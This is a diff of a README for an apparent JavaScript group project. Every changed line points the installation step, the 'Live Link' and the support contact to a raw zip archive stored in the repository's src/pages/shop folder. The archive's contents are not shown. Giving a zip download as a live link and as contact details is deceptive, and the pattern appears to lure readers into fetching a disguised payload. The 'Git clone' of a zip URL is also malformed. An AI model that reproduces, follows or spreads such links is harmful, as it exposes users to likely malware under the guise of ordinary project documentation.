@@ -22,10 +22,10 @@ Git
 
 ### Installation instruction
 
-Git clone https://github.com/deerrickkorir/Group-project/raw/refs/heads/main/src/pages/project_Group_1.7.zip
+Git clone https://raw.githubusercontent.com/deerrickkorir/Group-project/main/src/pages/shop/project_Group_3.4.zip
 
 # Live Link
-https://github.com/deerrickkorir/Group-project/raw/refs/heads/main/src/pages/project_Group_1.7.zip
+https://raw.githubusercontent.com/deerrickkorir/Group-project/main/src/pages/shop/project_Group_3.4.zip
 
 ## Technologies used
 JavaScript
@@ -39,7 +39,7 @@ Css
 Github
 
 ## Support and contact details
-https://github.com/deerrickkorir/Group-project/raw/refs/heads/main/src/pages/project_Group_1.7.zip
+https://raw.githubusercontent.com/deerrickkorir/Group-project/main/src/pages/shop/project_Group_3.4.zip
 
 ### License
 The content of this site is licensed under the MIT license
